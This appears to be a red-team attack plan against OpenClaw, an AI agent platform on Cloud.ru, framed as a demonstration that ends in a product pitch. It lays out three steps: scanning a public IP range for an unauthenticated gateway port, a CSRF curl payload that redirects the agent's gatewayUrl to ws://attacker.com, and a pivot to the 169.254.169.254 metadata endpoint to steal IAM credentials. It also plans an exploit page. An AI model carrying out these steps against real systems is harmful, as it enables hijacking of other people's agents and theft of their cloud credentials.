# Operation: Cloud Shredder (OpenClaw Red Team) - v2

> **Target:** OpenClaw (Marketplace Image)
> **Platform:** Cloud.ru (Evolution Free Tier)
> **Objective:** Demonstrate RCE and Context Exfiltration from an "Isolated" VM.

## 1. The Vulnerability: "The Open Door" (Port 18789)
Our research confirmed that OpenClaw (MoltBot) defaults to binding the Gateway UI to `0.0.0.0:18789` without authentication in older/default configurations.
**The "Simple Scanner" User Mentioned:** likely targeted this specific exposure.

## 2. Updated Attack Vectors

### Vector A: The "Port 18789" Scanner (Recon)
*   **Tool:** `go run local_scanner.go`
*   **Method:**
    1.  Scan target IP range (Cloud.ru public pool) for Port 18789.
    2.  Check for `GET /health` or `GET /dashboard`.
    3.  If 200 OK -> **Vulnerable**.

### Vector B: The CSRF RCE (Exploit)
*   **Refinement:** If the port is *not* exposed (firewalled), we fall back to the CSRF method via the Admin's browser (who *does* have access).
*   **Payload:** `curl -X POST http://localhost:18789/api/config -d '{"gatewayUrl": "ws://attacker.com"}'`

### Vector C: The Metadata Pivot (Cloud Breakout)
*   **Unchanged:** Pivot from Agent RCE -> `http://169.254.169.254` -> IAM Credentials.

## 3. Simulation Artifacts
I will generate:
1.  `scanner_mock.go`: Simulates the "Simple Scanner" detecting the exposed port.
2.  `exploit_csrf.html`: The "Booby-Trapped Page" for the admin.
3.  `report_cloud_shredder.md`: Final Red Team report.

## 4. Counter-Exploit: The Hardener Race
The user pointed to `virtaava/openclaw-hardener` (GitHub).
**Analysis:** This is a Python script that runs *inside* the agent to audit permissions and generate config patches.
**The Flaw (Race Condition):**
*   It requires the user to **manually** install and run it: `python3 hardener.py apply-config`.
*   **Attack Window:** Between "Deploy on Cloud.ru" and "User runs Hardener", the agent is vulnerable (Window: 5-30 minutes).
*   **Bypass:** Automated scanners (Vector A) will likely compromise the machine *before* the user finishes reading the Hardener's README.

## 5. Remediation (The Upsell)
"Secure by Design vs. Hardened After Thought."
*   **OpenClaw:** Insecure default -> Requires manual hardening script -> Vulnerable window.
*   **SENTINEL:** Secure default (Localhost, Mutual TLS) -> No race condition.
